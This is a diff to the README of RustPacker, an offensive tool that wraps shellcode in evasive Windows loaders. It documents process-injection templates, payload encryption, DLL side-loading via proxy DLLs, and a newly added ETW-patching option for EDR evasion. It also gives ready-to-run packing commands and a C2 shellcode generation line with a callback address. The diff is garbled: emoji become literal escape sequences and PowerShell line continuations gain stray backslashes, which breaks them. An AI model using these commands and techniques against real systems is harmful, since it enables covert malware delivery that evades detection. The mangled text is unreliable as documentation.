@@ -11,7 +11,7 @@
 
 ---
 
-## 🤔 New here? Start with this section
+## \ud83e\udd14 New here? Start with this section
 
 ### What is RustPacker?
 
@@ -21,7 +21,7 @@
 
 The result is a `.exe` or `.dll` that you deliver to your target during an authorized engagement.
 
-### ✨ Key Features
+### \u2728 Key Features
 
 - **Multiple Injection Templates** — CRT, APC, Fibers, EarlyCascade, Module Stomping…
 - **Encryption** — XOR, AES-256, UUID encoding
@@ -32,11 +32,11 @@ The result is a `.exe` or `.dll` that you deliver to your target during an autho
 
 ---
 
-## 🚀 Quick Start (Local Container — Recommended)
+## \ud83d\ude80 Quick Start (Local Container — Recommended)
 
 **The fastest and easiest way to use RustPacker! No Rust installation required.**
 
-### ✅ Step 1 — Install Podman or Docker
+### \u2705 Step 1 — Install Podman or Docker
 
 ```bash
 # Ubuntu / Debian
@@ -56,7 +56,7 @@ winget install Podman.Podman  # or install Podman Desktop
 
 Verify: `podman --version` or `docker --version`
 
-### 🏗️ Step 2 — Build the Container Locally
+### \ud83c\udfd7\ufe0f Step 2 — Build the Container Locally
 
 ```bash
 git clone https://github.com/Nariod/RustPacker.git
@@ -68,7 +68,7 @@ podman build -t rustpacker -f Dockerfile.all-in-one .
 
 This step is done **once**. The image is then cached locally.
 
-### 🎯 Step 3 — Generate Your First Payload
+### \ud83c\udfaf Step 3 — Generate Your First Payload
 
 **Important:** Place all your shellcode files (e.g., `shellcode.raw`, `payload.bin`) in the `shared/` directory of the RustPacker project. This directory is mounted inside the container at `/workdir/shared/`.
 
@@ -89,7 +89,7 @@ podman run --rm -v $(pwd):/workdir rustpacker \
 
 > **Note:** The container uses long-form arguments (`--shellcode-path`, `--format`, `--execution`, `--encryption`, `--output`). Template names support both short aliases (e.g., `ntcrt`, `ntapc`) and full names (e.g., `nt-create-remote-thread`, `nt-queue-user-apc`).
 
-### 🔄 Create an Alias for Daily Use
+### \ud83d\udd04 Create an Alias for Daily Use
 
 Add this to your `~/.bashrc` or `~/.zshrc`:
 
@@ -97,7 +97,7 @@ Add this to your `~/.bashrc` or `~/.zshrc`:
 alias rustpacker='podman run --rm -v $(pwd):/workdir rustpacker'
 ```
 
-> **⚠️ Remember:** Always place your shellcode files in the `shared/` directory. The alias mounts the current directory to `/workdir` in the container.
+> **\u26a0\ufe0f Remember:** Always place your shellcode files in the `shared/` directory. The alias mounts the current directory to `/workdir` in the container.
 
 Now use it directly:
 
@@ -120,7 +120,7 @@ rustpacker \
 ```
 
 <details>
-<summary>🪟 Windows setup instructions</summary>
+<summary>\ud83e\ude9f Windows setup instructions</summary>
 
 ### Step 1: Install a Container Runtime
 
@@ -148,15 +148,15 @@ podman build -t rustpacker -f Dockerfile.all-in-one .
 
 ```powershell
 # Place your shellcode in the shared directory
-copy C:\path\to\payload.raw shared\
+copy C:\path\to\payload.raw shared\\
 
 # PowerShell - Using container mode with long arguments
-podman run --rm -v ${PWD}:/workdir:z rustpacker `
-  --shellcode-path /workdir/shared/payload.raw `
-  --format exe `
-  --execution ntcrt `
-  --encryption aes `
-  --target-process notepad.exe `
+podman run --rm -v ${PWD}:/workdir:z rustpacker `\
+  --shellcode-path /workdir/shared/payload.raw `\
+  --format exe `\
+  --execution ntcrt `\
+  --encryption aes `\
+  --target-process notepad.exe `\
   --output /workdir/shared/output.exe
 
 # cmd.exe
@@ -177,7 +177,7 @@ function rustpacker { podman run --rm -v "${PWD}:/workdir:z" rustpacker @args }
 </details>
 
 <details>
-<summary id="macos">🍎 macOS setup instructions</summary>
+<summary id="macos">\ud83c\udf4e macOS setup instructions</summary>
 
 ```bash
 brew install podman
@@ -197,7 +197,7 @@ rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution
 </details>
 
 <details>
-<summary>🦀 Alternative: Native Mode (Rust toolchain required)</summary>
+<summary>\ud83e\udd80 Alternative: Native Mode (Rust toolchain required)</summary>
 
 If you already have Rust installed, you can run RustPacker directly without building the container first. It will **automatically detect** Podman or Docker and use a container only for cross-compilation:
 
@@ -219,7 +219,7 @@ The first run builds the `rustpacker-builder` image once. Subsequent runs reuse 
 
 ---
 
-## 🛠️ Choosing a Template
+## \ud83d\udee0\ufe0f Choosing a Template
 
 | I want to… | Recommended template |
 |------------|---------------------|
@@ -238,31 +238,31 @@ These inject shellcode into a remote process. Default target: `dllhost.exe`.
 
 | Template | API Level | Indirect Syscalls | Dynamic API | Description |
 |----------|-----------|:-----------------:|:-----------:|-------------|
-| `wincrt` | High (Windows-rs) | ❌ | ❌ | CreateRemoteThread via the official Windows crate |
-| `ntcrt` | Low (ntapi) | ❌ | ✅ | NtCreateThreadEx via dynamic NT API resolution |
-| `syscrt` | Syscall | ✅ | ❌ | NtCreateThreadEx via indirect syscalls |
-| `earlycascade` | Low (winapi) | ❌ | ❌ | EarlyCascade injection via shim engine callback hijacking |
+| `wincrt` | High (Windows-rs) | \u274c | \u274c | CreateRemoteThread via the official Windows crate |
+| `ntcrt` | Low (ntapi) | \u274c | \u2705 | NtCreateThreadEx via dynamic NT API resolution |
+| `syscrt` | Syscall | \u2705 | \u274c | NtCreateThreadEx via indirect syscalls |
+| `earlycascade` | Low (winapi) | \u274c | \u274c | EarlyCascade injection via shim engine callback hijacking |
 
 ### Self-Execution Templates (no `-t` needed)
 
 These execute shellcode within the current process.
 
-| Template | API Level | Indirect Syscalls | Dynamic API | Description |
-|----------|-----------|:-----------------:|:-----------:|-------------|
-| `ntapc` | Low (ntapi) | ❌ | ✅ | Queue APC to current thread via dynamic NT API resolution |
-| `winfiber` | High (windows-sys) | ❌ | ❌ | Fiber-based execution via Windows API |
-| `ntfiber` | Low (ntapi + windows-sys) | ❌ | ✅ | Fiber-based execution via dynamic NT API resolution |
-| `sysfiber` | Syscall (ntapi + windows-sys) | ✅ | ❌ | Fiber-based execution via indirect syscalls |
-| `ntstomp` | Low (ntapi) | ❌ | ✅ | Module stomping: overwrites a legit DLL's .text with shellcode |
-| `ntwat` | Low (ntapi) | ❌ | ✅ | WebAssembly stager: wraps the encrypted payload in a wasm module (WAT text format, low entropy), reads the data section back out at runtime, then self-executes |
+| Template | API Level | Indirect Syscalls | Dynamic API | ETW patching compatible | Description |
+|----------|-----------|:-----------------:|:-----------:|:------------------------:|-------------|
+| `ntapc` | Low (ntapi) | \u274c | \u2705 | \u274c | Queue APC to current thread via dynamic NT API resolution |
+| `winfiber` | High (windows-sys) | \u274c | \u274c | \u274c | Fiber-based execution via Windows API |
+| `ntfiber` | Low (ntapi + windows-sys) | \u274c | \u2705 | \u274c | Fiber-based execution via dynamic NT API resolution |
+| `sysfiber` | Syscall (ntapi + windows-sys) | \u2705 | \u274c | \u2705 | Fiber-based execution via indirect syscalls |
+| `ntstomp` | Low (ntapi) | \u274c | \u2705 | \u274c | Module stomping: overwrites a legit DLL's .text with shellcode |
+| `ntwat` | Low (ntapi) | \u274c | \u2705 | \u274c | WebAssembly stager: wraps the encrypted payload in a wasm module (WAT text format, low entropy), reads the data section back out at runtime, then self-executes |
 
 ---
 
-## 📖 Command Line Options
+## \ud83d\udcd6 Command Line Options
 
 The container mode uses long-form arguments. Both short and long forms are supported in native mode.
 
-> **⚠️ Important for container mode:** All files (shellcode, output, proxy DLLs) must be placed in or output to the `shared/` directory. This directory is mounted at `/workdir/shared/` inside the container.
+> **\u26a0\ufe0f Important for container mode:** All files (shellcode, output, proxy DLLs) must be placed in or output to the `shared/` directory. This directory is mounted at `/workdir/shared/` inside the container.
 
 ### Container Mode (Recommended)
 
@@ -279,6 +279,7 @@ Optional:
   -t, --target-process <PROCESS>  Target process to inject into (default: dllhost.exe, CRT templates only)
   --sandbox <DOMAIN>          Domain pinning: only execute on the specified domain name
   -p, --proxy-dll <DLL_PATH>  DLL proxying: path to legitimate DLL to proxy (requires -f dll, self-injection templates only)
+  --etw-patch                 Patch ETW functions to disable Event Tracing for Windows (EDR evasion, requires self-injection templates with indirect syscalls)
   -o, --output <PATH>         Custom output path for the resulting binary
   --help                      Print help
   --version                   Print version
@@ -299,6 +300,7 @@ Optional:
   -t <PROCESS>      Target process to inject into (default: dllhost.exe, CRT templates only)
   --sandbox <DOMAIN>  Domain pinning: only execute on the specified domain name
   -p <DLL_PATH>     DLL proxying: path to legitimate DLL to proxy (requires -f dll, self-injection templates only)
+  --etw-patch       Patch ETW functions to disable Event Tracing for Windows (EDR evasion, requires self-injection templates with indirect syscalls)
   -o <PATH>         Custom output path for the resulting binary
   -h                Print help
   -V                Print version
@@ -306,7 +308,7 @@ Optional:
 
 ---
 
-## 📋 Usage Examples
+## \ud83d\udccb Usage Examples
 
 ### Generate Shellcode
 
@@ -326,7 +328,7 @@ generate --mtls 192.168.1.100:443 --format shellcode --os windows
 
 ### Packing Examples
 
-> **⚠️ Important:** All shellcode files must be placed in the `shared/` directory before running these commands. The container mounts `shared/` at `/workdir/shared/`.
+> **\u26a0\ufe0f Important:** All shellcode files must be placed in the `shared/` directory before running these commands. The container mounts `shared/` at `/workdir/shared/`.
 >
 > The examples below use the `rustpacker` alias defined in the Quick Start section. Replace it with the full `podman run --rm -v $(pwd):/workdir rustpacker` command if you haven't set up the alias.
 
@@ -360,6 +362,11 @@ rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution
 rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution ntcrt --encryption aes --output /workdir/shared/my_binary.exe
 ```
 
+**With ETW patching (EDR evasion for sysfiber template):**
+```bash
+rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution sysfiber --encryption aes --etw-patch --output /workdir/shared/payload.exe
+```
+
 **DLL proxying (side-loading):**
 
 **Important:** Both your shellcode file AND the DLL to proxy must be placed in the `shared/` directory.
@@ -373,19 +380,20 @@ cp /mnt/c/Windows/System32/version.dll shared/   # from WSL
 rustpacker --shellcode-path /workdir/shared/payload.raw --format dll --execution ntfiber --encryption aes --proxy-dll /workdir/shared/version.dll --output /workdir/shared/proxy.dll
 ```
 
-The proxy DLL forwards all exports to the renamed original (`version_orig.dll`) and executes your shellcode on load via `DllMain`. Deploy by placing the proxy DLL alongside the target application with the original DLL renamed (e.g., `version.dll` → `version_orig.dll`).
+The proxy DLL forwards all exports to the renamed original (`version_orig.dll`) and executes your shellcode on load via `DllMain`. Deploy by placing the proxy DLL alongside the target application with the original DLL renamed (e.g., `version.dll` \u2192 `version_orig.dll`).
 
 > **Note:** The `--proxy-dll` path must be accessible from within the container. Use the `/workdir/` prefix for all paths when running in container mode.
 
 ---
 
-## 🔒 Detection Evasion
+## \ud83d\udd12 Detection Evasion
 
 RustPacker implements several evasion techniques:
 
 - **No RWX Memory**: Memory is allocated as RW, written, then re-protected as RX only — never RWX. This eliminates a major behavioral detection signal used by EDR/AV.
 - **Dynamic API Resolution** (`nt*` templates): NT API functions are resolved at runtime via `GetProcAddress` with XOR-obfuscated function names (random key per build). This removes suspicious ntdll imports from the PE import table.
 - **Indirect Syscalls**: Bypass user-mode hooks (`syscrt`, `sysfiber` templates)
+- **ETW Patching**: Disables Event Tracing for Windows functions (EtwEventWrite, EtwEventRegister, etc.) via indirect syscalls to bypass EDR monitoring (available with `--etw-patch` flag for `sysfiber` template)
 - **Payload Encryption**: XOR encoding, AES-256-CBC encryption, or UUID-based encoding
 - **String Encryption**: Runtime literals in generated loaders are wrapped with litcrypt to reduce static string exposure
 - **Process Injection**: Hide execution in legitimate processes
@@ -394,11 +402,11 @@ RustPacker implements several evasion techniques:
 - **Template Variety**: Multiple execution methods to avoid static signatures
 - **Rust Compilation**: Native binaries with stripped symbols and LTO
 
-> ⚠️ **Breaking Change**: Since RWX (PAGE_EXECUTE_READWRITE) is no longer used, **self-modifying / dynamic shellcode is not supported**. Only static shellcode payloads are compatible. Most C2 frameworks (Metasploit, Sliver, Cobalt Strike, Havoc) generate static shellcode by default — this should not affect typical usage.
+> \u26a0\ufe0f **Breaking Change**: Since RWX (PAGE_EXECUTE_READWRITE) is no longer used, **self-modifying / dynamic shellcode is not supported**. Only static shellcode payloads are compatible. Most C2 frameworks (Metasploit, Sliver, Cobalt Strike, Havoc) generate static shellcode by default — this should not affect typical usage.
 
 ---
 
-## ⚙️ Local Installation (Without Containers)
+## \u2699\ufe0f Local Installation (Without Containers)
 
 If you prefer to compile without containers (Linux only):
 
@@ -427,7 +435,7 @@ cargo run -- -s shared/payload.raw -i ntcrt -e xor -f exe -t explorer.exe
 
 ---
 
-## 🐳 Why Podman over Docker?
+## \ud83d\udc33 Why Podman over Docker?
 
 We recommend using Podman instead of Docker for [security reasons](https://cloudnweb.dev/2019/10/heres-why-podman-is-more-secured-than-docker-devsecops/):
 - Rootless containers by default
@@ -436,7 +444,7 @@ We recommend using Podman instead of Docker for [security reasons](https://cloud
 
 ---
 
-## 🧩 Adding a New Template
+## \ud83e\udde9 Adding a New Template
 
 RustPacker templates are self-contained Rust projects under `templates/` that the generator copies and substitutes placeholders into at build time. Adding a new injection technique is a well-defined, six-step process. The `ntStomp` (module stomping) template is a good reference implementation to mirror.
 
@@ -446,10 +454,10 @@ Create a folder under `templates/` named after your technique (convention: API-l
 
 ```
 templates/ntStomp/
-├── .gitignore          # ignore target/ and Cargo.lock
-├── Cargo.toml          # template manifest with placeholders
-└── src/
-    └── main.rs         # the loader source with placeholders
+\u251c\u2500\u2500 .gitignore          # ignore target/ and Cargo.lock
+\u251c\u2500\u2500 Cargo.toml          # template manifest with placeholders
+\u2514\u2500\u2500 src/
+    \u2514\u2500\u2500 main.rs         # the loader source with placeholders
 ```
 
 The `.gitignore` should exclude build artifacts:
@@ -545,13 +553,13 @@ NtModuleStomping,
 
 Then update the three `impl Execution` members:
 
-- `template_name(&self)` → map the variant to the directory name: `Execution::NtModuleStomping => "ntStomp"`,
-- `is_self_injection(&self)` → return `true` if the technique runs in-process (enables DLL proxying via `-p`).
+- `template_name(&self)` \u2192 map the variant to the directory name: `Execution::NtModuleStomping => "ntStomp"`,
+- `is_self_injection(&self)` \u2192 return `true` if the technique runs in-process (enables DLL proxying via `-p`).
 - The existing unit tests (`test_execution_is_self_injection`, `test_execution_display`, `test_template_name`) should be extended to cover the new variant.
 
 ### Step 5 — Add the template to the integration test
 
-In `rustpacker-core/src/generator.rs`, append the new variant to the `all_combinations()` array used by `test_assemble_leaves_no_template_placeholders`. This guarantees the template assembles cleanly for every `exe`/`dll` × `xor`/`aes`/`uuid` combination and leaves no placeholder behind:
+In `rustpacker-core/src/generator.rs`, append the new variant to the `all_combinations()` array used by `test_assemble_leaves_no_template_placeholders`. This guarantees the template assembles cleanly for every `exe`/`dll` \u00d7 `xor`/`aes`/`uuid` combination and leaves no placeholder behind:
 
 ```rust
 let executions = [
@@ -578,13 +586,13 @@ let executions = [
 | `templates/ntWat/` | WebAssembly (WAT) stager self-injection template |
 | `rustpacker-core/src/wat.rs` | WAT generation + wasm compilation for the ntWat template |
 | `rustpacker-core/src/config.rs` | `Execution` enum, aliases, `is_self_injection`, `template_name` |
-| `rustpacker-core/src/replacements.rs` | Placeholder → value map construction |
+| `rustpacker-core/src/replacements.rs` | Placeholder \u2192 value map construction |
 | `rustpacker-core/src/generator.rs` | Template copy + substitution orchestration + integration test |
 | `rustpacker-core/src/dll.rs` | DLL-format handling (`DllMain`, `lib.rs` rename) |
 | `templates/common.rs` | Shared `wipe()` helper injected into every template |
 
 
-## 🤝 Contributing
+## \ud83e\udd1d Contributing
 
 Contributions are welcome! Here's how you can help:
 
@@ -595,7 +603,7 @@ Contributions are welcome! Here's how you can help:
 
 ---
 
-## 🙏 Acknowledgments
+## \ud83d\ude4f Acknowledgments
 
 - [0xNinjaCyclone](https://github.com/0xNinjaCyclone) & [Karkas](https://github.com/Karkas66) - [EarlyCascade injection technique](https://github.com/Karkas66/EarlyCascadeImprooved)
 - [0xWerz](https://github.com/0xWerz) - String encryption implementation
@@ -607,9 +615,9 @@ Contributions are welcome! Here's how you can help:
 
 ---
 
-## 📄 License & Legal Notice
+## \ud83d\udcc4 License & Legal Notice
 
-**⚠️ IMPORTANT DISCLAIMER ⚠️**
+**\u26a0\ufe0f IMPORTANT DISCLAIMER \u26a0\ufe0f**
 
 This tool is provided for **educational and authorized penetration testing purposes only**.
 
@@ -624,8 +632,8 @@ This tool is provided for **educational and authorized penetration testing purpo
 
 <div align="center">
 
-**Made with ❤️ for the cybersecurity community**
+**Made with \u2764\ufe0f for the cybersecurity community**
 
-[Report Issues](https://github.com/Nariod/RustPacker/issues) • [Contribute](https://github.com/Nariod/RustPacker/pulls) • [Documentation](https://github.com/Nariod/RustPacker/wiki)
+[Report Issues](https://github.com/Nariod/RustPacker/issues) \u2022 [Contribute](https://github.com/Nariod/RustPacker/pulls) \u2022 [Documentation](https://github.com/Nariod/RustPacker/wiki)
 
 </div>
